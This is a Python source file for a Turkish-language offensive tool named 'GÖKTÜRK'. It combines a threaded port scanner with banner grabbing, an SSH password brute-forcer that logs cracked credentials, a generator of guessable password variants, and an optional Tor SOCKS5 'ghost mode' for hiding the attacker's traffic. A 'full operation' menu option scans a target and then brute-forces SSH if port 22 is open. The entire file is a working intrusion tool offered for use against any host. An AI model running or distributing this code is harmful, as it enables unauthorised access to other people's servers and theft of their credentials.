import socket
import threading
import socks
import paramiko
import time
import os
from datetime import datetime
from colorama import Fore, Style, init

# Colorama başlatma
init(autoreset=True)

class GokturkFramework:
    def __init__(self):
        self.target = ""
        self.open_ports = []
        self.banner_display()

    def banner_display(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.CYAN + Style.BRIGHT + """
        #################################################
        #                                               #
        #           G Ö K T Ü R K   V - 0.1             #
        #        -----------------------------          #
        #        [ WICKY TARAFINDAN YAPILMISTIR ]       #
        #                                               #
        #################################################
        """)
        print(Fore.YELLOW + f"[*] Operasyon Başlangıcı: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")

    def setup_proxy(self):
        try:
            proxy_ip = "127.0.0.1" 
            proxy_port = 9050 
            socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
            socket.socket = socks.socksocket
            print(Fore.MAGENTA + "[!] HAYALET MODU AKTİF: Trafik SOCKS5 üzerinden geçiyor.")
        except Exception as e:
            print(Fore.RED + f"[-] Proxy Hatası: {e}")

    def save_log(self, message):
        with open("operasyon_gunlugu.txt", "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {message}\n")

    def get_banner(self, s):
        try:
            s.send(b'HEAD / HTTP/1.0\r\n\r\n')
            banner = s.recv(1024).decode().strip()
            return banner.split('\n')[0] if banner else "Servis bilgisi gizli."
        except:
            return "Servis bilgisi alınamadı."

    def scan_port(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            result = s.connect_ex((self.target, port))
            if result == 0:
                service = self.get_banner(s)
                msg = f"Port {port} AÇIK | Servis: {service}"
                print(Fore.GREEN + Style.BRIGHT + f"[+] {msg}")
                self.save_log(msg)
                self.open_ports.append((port, service))
            s.close()
        except:
            pass

    def ssh_connect(self, ip, username, password):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(ip, username=username, password=password, timeout=3)
            msg = f"SSH BAŞARILI! Giriş sağlandı -> {username}:{password}"
            print(Fore.GREEN + Style.BRIGHT + f"\n[!!!] {msg}")
            self.save_log(msg)
            client.close()
            return True
        except:
            return False

    def start_brute_force(self, ip, username, wordlist_file):
        if not os.path.exists(wordlist_file):
            print(Fore.RED + f"[-] Hata: {wordlist_file} dosyası bulunamadı!")
            return

        print(Fore.YELLOW + f"[*] {username} kullanıcısı için sızma denemesi başlıyor...")
        with open(wordlist_file, "r") as f:
            for line in f:
                password = line.strip()
                print(Fore.WHITE + f"[#] Deneniyor: {password}", end="\r")
                if self.ssh_connect(ip, username, password):
                    return
                time.sleep(0.3)
        print(Fore.RED + "\n[-] Wordlist bitti, başarılı giriş yapılamadı.")

    def run_wordlist_gen(self):
        print(Fore.CYAN + "\n[+] L33T-GEN: Şifre Listesi Üreticisi Aktif")
        base_word = input(Fore.WHITE + "[+] Baz Kelime (Örn: isim, şirket): ")
        suffixes = ["", "123", "2026", "1453", "!", "!", "2025", "34", "06"]
        prefixes = ["", "M.", "Admin", "User", "Siber"]
        
        filename = "ozel_wordlist.txt"
        with open(filename, "w") as f:
            for p in prefixes:
                for s in suffixes:
                    f.write(f"{p}{base_word}{s}\n")
                    f.write(f"{p}{base_word.lower()}{s}\n")
                    f.write(f"{p}{base_word.upper()}{s}\n")
        
        print(Fore.GREEN + f"[!] İşlem tamam! '{filename}' dosyası hazırlandı.")

    def run_port_scan(self):
        print(Fore.CYAN + f"\n[*] {self.target} üzerinde yüksek hızlı keşif başlatıldı...")
        threads = []
        for port in range(1, 1025):
            t = threading.Thread(target=self.scan_port, args=(port,))
            threads.append(t)
            t.start()
            time.sleep(0.01)
        for t in threads:
            t.join()

    def start_operation(self):
        raw_target = input(Fore.WHITE + "\n[+] Hedef IP veya Domain: ")
        self.target = raw_target.replace("https://", "").replace("http://", "").split('/')[0]
        
        while True:
            print(Fore.BLUE + "\n" + "="*45)
            print(Fore.CYAN + "         GÖKTÜRK OPERASYON MENÜSÜ")
            print(Fore.BLUE + "="*45)
            print(Fore.GREEN + " [1] KEŞİF (Port Tarama & Analiz)")
            print(Fore.RED + " [2] SSH SIZMA (Brute Force)")
            print(Fore.YELLOW + " [3] TAM OPERASYON (Keşif + Sızma)")
            print(Fore.MAGENTA + " [4] WORDLIST ÜRETİCİ (L33T-GEN)")
            print(Fore.WHITE + " [0] ÇIKIŞ")
            print(Fore.BLUE + "="*45)
            
            secim = input(Fore.WHITE + "\n[?] Seçiminiz: ")

            if secim == "0": break

            mode = input(Fore.MAGENTA + "[?] Hayalet Modu (Proxy) Aktif Edilsin mi? (e/h): ").lower()
            if mode == 'e': self.setup_proxy()

            if secim == "1":
                self.run_port_scan()
            elif secim == "2":
                user = input(Fore.WHITE + "[+] SSH Kullanıcı Adı: ")
                w_list = input(Fore.WHITE + "[+] Wordlist Dosyası: ")
                self.start_brute_force(self.target, user, w_list)
            elif secim == "3":
                self.run_port_scan()
                if any(p[0] == 22 for p in self.open_ports):
                    print(Fore.RED + "\n[!] SSH AÇIK! Sızma denensin mi? (e/h)")
                    if input().lower() == 'e':
                        user = input(Fore.WHITE + "[+] Kullanıcı Adı: ")
                        w_list = input(Fore.WHITE + "[+] Wordlist: ")
                        self.start_brute_force(self.target, user, w_list)
            elif secim == "4":
                self.run_wordlist_gen()
            
            self.create_report()

    def create_report(self):
        print(Fore.YELLOW + "\n[*] Rapor güncelleniyor...")
        with open("operasyon_raporu.html", "w", encoding="utf-8") as r:
            r.write(f"<html><body style='background:#111; color:#eee; font-family:sans-serif;'>")
            r.write(f"<h1 style='color:#00ff00;'>GÖKTÜRK Operasyon Raporu</h1>")
            r.write(f"<p>Hedef: {self.target} | Tarih: {datetime.now()}</p><hr>")
            r.write("<h3>Açık Portlar:</h3><ul>")
            for p, s in self.open_ports:
                r.write(f"<li><b>Port {p}:</b> {s}</li>")
            r.write("</ul></body></html>")
        print(Fore.GREEN + "[!] Rapor hazır!")

if __name__ == "__main__":
    gokturk = GokturkFramework()
    gokturk.start_operation()
